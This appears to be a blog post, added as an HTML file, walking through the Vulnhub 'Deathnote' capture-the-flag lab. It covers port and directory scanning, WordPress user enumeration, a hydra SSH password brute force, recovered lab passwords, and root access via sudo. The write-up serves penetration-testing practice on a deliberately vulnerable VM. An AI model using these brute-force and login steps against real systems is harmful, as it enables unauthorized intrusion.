@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Vulnhub - Deathnote | xf0lt</title>
+<meta property="og:title" content="Vulnhub - Deathnote | xf0lt" />
+<meta name="twitter:title" content="Vulnhub - Deathnote | xf0lt" />
+<meta itemprop="name" content="Vulnhub - Deathnote | xf0lt" />
+<meta name="application-name" content="Vulnhub - Deathnote | xf0lt" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="/" />
+  <meta property="og:image" content="/" />
+  <meta name="twitter:image" content="/" />
+  <meta name="twitter:image:src" content="/" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-07-14T08:52:55&#43;0700 />
+    <meta property="article:published_time" content=2023-07-14T08:52:55&#43;0700 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Vulnhub - Deathnote",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-07-14",
+        "description": "",
+        "wordCount":  1675 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-07-14",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "xf0lt"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.111.3">
+
+    
+
+    <link rel="canonical" href="../posts/deathnote.html">
+    <link href="../style.min.4ed3d676e31886addd6440b2cc3a3456841d9fd9814afda822d529b052e62755.css" rel="stylesheet">
+    
+    <link href="../code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+    
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="../icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="../icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="../icons/favicon-16x16.png">
+    <link rel="mask-icon" href="../icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="../favicon.ico">
+
+
+
+
+<link rel="manifest" href="../site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="../icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "" class="notransition">
+
+<script src="../js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="../" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link active" href="../posts.html">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="../pages/about.html">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="">
+                        
+                    </a>
+                    
+                </li>
+                
+                
+            </ul>
+            
+        </div>
+    </nav>
+</div>
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Vulnhub - Deathnote</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-07-14T08:52:55&#43;07:00" itemprop="datePublished"> Jul 14, 2023 </time>
+                </div>
+                
+            </header><div class="page-content">
+                <h1 id="vulnhub---deathnote">Vulnhub - Deathnote</h1>
+<p><img src="../images/deathnote/web.jpeg" alt="image"></p>
+<h1 id="disclaimer">DISCLAIMER</h1>
+<hr>
+<blockquote>
+<p>Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only.</p>
+</blockquote>
+<hr>
+<h1 id="port-scaning">PORT SCANING</h1>
+<p>&mdash;***</p>
+<pre tabindex="0"><code>┌──(xf0lt㉿kali)-[~/vulnhub/deathnote]
+└─$ nmap -sC -sV -Pn -T4 -oA nmap 192.168.56.105
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-30 14:54 WIB
+Nmap scan report for deatnote.local (192.168.56.105)
+Host is up (0.00061s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 5e:b8:ff:2d:ac:c7:e9:3c:99:2f:3b:fc:da:5c:a3:53 (RSA)
+|   256 a8:f3:81:9d:0a:dc:16:9a:49:ee:bc:24:e4:65:5c:a6 (ECDSA)
+|_  256 4f:20:c3:2d:19:75:5b:e8:1f:32:01:75:c2:70:9a:7e (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn&#39;t have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds
+</code></pre><h1 id="website">WEBSITE</h1>
+<hr>
+<p>Before I dig deeper, I tried to visit the ip address on the browser but it can&rsquo;t be accessed. So what I did was try to intercept the ip address using burpsuite. Is there something else inside or something? and here i get a url with path wordpress.</p>
+<p><img src="../images/deathnote/burpsuiet.jpg" alt="image"></p>
+<p>After I got the url address, I tried again on the browser but the same thing happened, we didn&rsquo;t get any results. So I tried to change it to my local address</p>
+<pre tabindex="0"><code>┌──(xf0lt㉿kali)-[~/vulnhub/deathnote]
+└─$ cat /etc/hosts
+192.168.56.105 deathnote.vuln
+</code></pre><p><img src="../images/deathnote/dirb.jpg" alt="image"></p>
+<h1 id="dirb">DIRB</h1>
+<hr>
+<p>Runing dirb to see the result from WordPress url path. I found the robots.txt file</p>
+<pre tabindex="0"><code>┌──(xf0lt㉿kali)-[~/vulnhub/deathnote]
+└─$ dirb http://deathnote.vuln/                                                                                                                                                                                                                                                             
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Sep 30 15:48:06 2022
+URL_BASE: http://deathnote.vuln/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://deathnote.vuln/ ----
++ http://deathnote.vuln/index.html (CODE:200|SIZE:197)                                                                                                                
+==&gt; DIRECTORY: http://deathnote.vuln/manual/                                                                                                                          
++ http://deathnote.vuln/robots.txt (CODE:200|SIZE:68)                                                                                                                 
++ http://deathnote.vuln/server-status (CODE:403|SIZE:279)                                                                                                             
+==&gt; DIRECTORY: http://deathnote.vuln/wordpress/                                                                                                                                                        
+---- Entering directory: http://deathnote.vuln/manual/ ----
+==&gt; DIRECTORY: http://deathnote.vuln/manual/da/                                                                                                                       
+==&gt; DIRECTORY: http://deathnote.vuln/manual/de/                                                                                                                       
+==&gt; DIRECTORY: http://deathnote.vuln/manual/en/                                                                                                                       
+==&gt; DIRECTORY: http://deathnote.vuln/manual/es/                                                                                                                       
+==&gt; DIRECTORY: http://deathnote.vuln/manual/fr/                                                                                                                       
+==&gt; DIRECTORY: http://deathnote.vuln/manual/images/                                                                                                                   
++ http://deathnote.vuln/manual/index.html (CODE:200|SIZE:626)                                                                                                         
+==&gt; DIRECTORY: http://deathnote.vuln/manual/ja/                                                                                                                       
+==&gt; DIRECTORY: http://deathnote.vuln/manual/ko/                                                                                                                       
+==&gt; DIRECTORY: http://deathnote.vuln/manual/style/                                                                                                                    
+==&gt; DIRECTORY: http://deathnote.vuln/manual/tr/                                                                                                                       
+==&gt; DIRECTORY: http://deathnote.vuln/manual/zh-cn/                                                                                                                    
+                                                                                                                                                                      
+---- Entering directory: http://deathnote.vuln/wordpress/ ----
+</code></pre><p>The robots.txt file shows an image file, but when I access it I can&rsquo;t see anything from the file. Then I tried to get it with a wget.</p>
+<p><img src="../images/deathnote/robotstxt.jpg" alt="image"></p>
+<p><img src="../images/deathnote/important.jpg" alt="image"></p>
+<pre tabindex="0"><code>┌──(trysked㉿kali)-[~/vulnhub/deathnote]
+└─$ wget http://deathnote.vuln/important.jpgm
+</code></pre><p>because previously I could not see anything in the image file, so now I try to see the file type.</p>
+<pre tabindex="0"><code>┌──(trysked㉿kali)-[~/vulnhub/deathnote]
+└─$ file important.jpg
+important.jpg: ASCII text
+</code></pre><p>it turns out that in the picture there is a hidden message.</p>
+<pre tabindex="0"><code>┌──(trysked㉿kali)-[~/vulnhub/deathnote]
+└─$ cat important.jpg 
+i am Soichiro Yagami, light&#39;s father
+i have a doubt if L is true about the assumption that light is kira
+
+i can only help you by giving something important
+
+login username : user.txt
+i don&#39;t know the password.
+find it by yourself 
+but i think it is in the hint section of site
+</code></pre><h1 id="wpscan">WPSCAN</h1>
+<hr>
+<p>We already know what technology was used to build this website, so I need to find out how many users use wpscan. and I found one user that is Kira</p>
+<pre tabindex="0"><code>┌──(xf0lt㉿kali)-[~/vulnhub/deathnote]
+└─$ wpscan --url http://deathnote.vuln/wordpress/ -e u
+   _______________________________________________________________
+      __          _______   _____
+      \ \        / /  __ \ / ____|
+       \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+        \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
+         \  /\  /  | |     ____) | (__| (_| | | | |
+          \/  \/   |_|    |_____/ \___|\__,_|_| |_
+      WordPress Security Scanner by the WPScan Team
+                      Version 3.8.22
+    Sponsored by Automattic - https://automattic.com/
+    @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+______________________________________________________________
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N]n
+[+] URL: http://deathnote.vuln/wordpress/ [192.168.56.105]
+[+] Started: Fri Sep 30 15:41:40 202
+Interesting Finding(s)
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.38 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100
+[+] XML-RPC seems to be enabled: http://deathnote.vuln/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 &lt;=========================================================================================&gt; (10 / 10) 100.00% Time: 00:00:0
+[i] User(s) Identified
+Trysked, [30/9/22 3:43 PM
+[+] kira
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://deathnote.vuln/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/registe
+[+] Finished: Fri Sep 30 15:41:44 2022
+[+] Requests Done: 13
+[+] Cached Requests: 47
+[+] Data Sent: 3.634 KB
+[+] Data Received: 11.444 KB
+[+] Memory used: 203.059 MB
+[+] Elapsed time: 00:00:04
+</code></pre><p>before I say first for this stupid thing I have been waiting for the results from hydra and wpscan to bruteforce the password, but I thought that instead of wasting my time, I explored the website and found a unique word here.</p>
+<p><img src="../images/deathnote/pasS.jpg" alt="image"></p>
+<p>after I get the user name and password then I try to login on the wp-admin page.</p>
+<p><img src="../images/deathnote/login-pages.png" alt="image"></p>
+<p>next I take the file notes.txt using wget</p>
+<p><img src="../images/deathnote/notes.png" alt="image"></p>
+<pre tabindex="0"><code>┌──(xf0lt㉿kali)-[~/vulnhub/deathnote]
+└─$ wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt 
+</code></pre><p>After I got the notes.txt , then I looked at the contents of the file and it turned out that the contents were in the form of a list of passwords. Then the next step I brutforced using hydra. Before I bruteforce the notes.txt file I, changed it to pass and I create a user list with user names containing the names of Kira and l, because that&rsquo;s the only user I know. if you get more users you can enter it as a list.</p>
+<h1 id="hydra">HYDRA</h1>
+<hr>
+<pre tabindex="0"><code>┌──(xf0lt㉿kali)-[~/vulnhub/deathnote]
+└─$ hydra -L user -P pass 192.168.56.105 ssh           
+Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-30 21:07:28
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 129 login tries (l:3/p:43), ~9 tries per task
+[DATA] attacking ssh://192.168.56.105:22/
+[22][ssh] host: 192.168.56.105   login: l   password: death4me
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-30 21:07:53
+</code></pre><p>After I get the next user and password I do ssh</p>
+<pre tabindex="0"><code>┌──(xf0lt㉿kali)-[~/vulnhub/deathnote]
+└─$ ssh l@192.168.56.105   
+l@192.168.56.105&#39;s password: 
+Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Sep 30 10:09:22 2022 from 192.168.56.1
+l@deathnote:~$
+</code></pre><p>then I moved to the /opt/L directory. then here I found two folders, so I tried to enter the first folder called fake-notebook-rule.</p>
+<pre tabindex="0"><code>l@deathnote:/opt/L$ ls
+fake-notebook-rule  kira-case   
+l@deathnote:/opt/L$
+</code></pre><p>i see two files, i tried instead of the hint file there it tells me to use cyberchef. then I also open the case.wav file its contents are hex text. I use cyberchef to identify the type of text. and I get the password in encrypted form using base64.</p>
+<pre tabindex="0"><code>@deathnote:/opt/L/fake-notebook-rule$ ls
+case.wav  hint
+l@deathnote:/opt/L/fake-notebook-rule$ cat hint
+use cyberchef
+l@deathnote:/opt/L/fake-notebook-rule$ cat case.wav 
+63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d   
+l@deathnote:/opt/L/fake-notebook-rule$ echo -n &#39;cGFzc3dkIDoga2lyYWlzZXZpbCA=&#39; | base64 -d
+passwd : kiraisevil
+l@deathnote:/opt/L/fake-notebook-rule$
+</code></pre><p>in the /home directory I found two users, I have done many things to both of them but to no avail, because I have found the password I tried ssh l with the password I found but couldn&rsquo;t connect, so I tried kira.</p>
+<pre tabindex="0"><code>┌──(xf0lt㉿kali)-[~/vulnhub/deathnote]
+└─$ ssh kira@192.168.56.105 
+kira@192.168.56.105&#39;s password: 
+Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_6
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Sep  4 06:00:09 2021 from 127.0.0.1
+kira@deathnote:~$
+</code></pre><p>after logging in as guess i try to see what&rsquo;s there, I found a txt file and it looks like it&rsquo;s just a user flag code or something, so I ignore it first and find out more.</p>
+<pre tabindex="0"><code>kira@deathnote:~$ ls
+kira.txt
+kira@deathnote:~$ cat kira.txt
+cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
+kira@deathnote:~$
+</code></pre><p>now i try to see the user who can login as root.</p>
+<pre tabindex="0"><code>kira@deathnote:~$ sudo -l
+[sudo] password for kira: 
+Matching Defaults entries for kira on deathnote:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bi
+User kira may run the following commands on deathnote:
+(ALL : ALL) ALL
+kira@deathnote:~$
+</code></pre><p>I was told kira can access root on this host. i was told guess can access root on this host. I tried to access it as normal. and yeah we go to root. congrats for you and me.</p>
+<pre tabindex="0"><code>kira@deathnote:~$ sudo su
+root@deathnote:/home/kira# cd /root
+root@deathnote:~# pwd
+/root
+root@deathnote:~# ls
+root.txt
+root@deathnote:~# cat root.tx
+   ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       :::::::: 
+   :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+: 
+  +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+         
+ +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++   
++#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+    
+#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     
+########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########      
+##########follow me on twitter###########3
+and share this screen shot and tag @KDSAMF
+root@deathnote:~#
+</code></pre>
+            </div>
+        </article></main>
+    
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/xf0lt" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com/Trysked1" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="https://app.hackthebox.com/profile/834790" target="_blank" rel="noopener noreferrer me"
+    title="Hackthebox">
+    <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+</a>
+<a href="https://t.me/xf0lt" target="_blank" rel="noopener noreferrer me"
+    title="Telegram">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M21.198 2.433a2.242 2.242 0 0 0-1.022.215l-8.609 3.33c-2.068.8-4.133 1.598-5.724 2.21a405.15 405.15 0 0 1-2.849 1.09c-.42.147-.99.332-1.473.901-.728.968.193 1.798.919 2.286 1.61.516 3.275 1.009 4.654 1.472.509 1.793.997 3.592 1.48 5.388.16.36.506.494.864.498l-.002.018s.281.028.555-.038a2.1 2.1 0 0 0 .933-.517c.345-.324 1.28-1.244 1.811-1.764l3.999 2.952.032.018s.442.311 1.09.355c.324.022.75-.04 1.116-.308.37-.27.613-.702.728-1.196.342-1.492 2.61-12.285 2.997-14.072l-.01.042c.27-1.006.17-1.928-.455-2.474a1.654 1.654 0 0 0-1.034-.407z" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 xf0lt.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
+        theme on
+        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="../js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
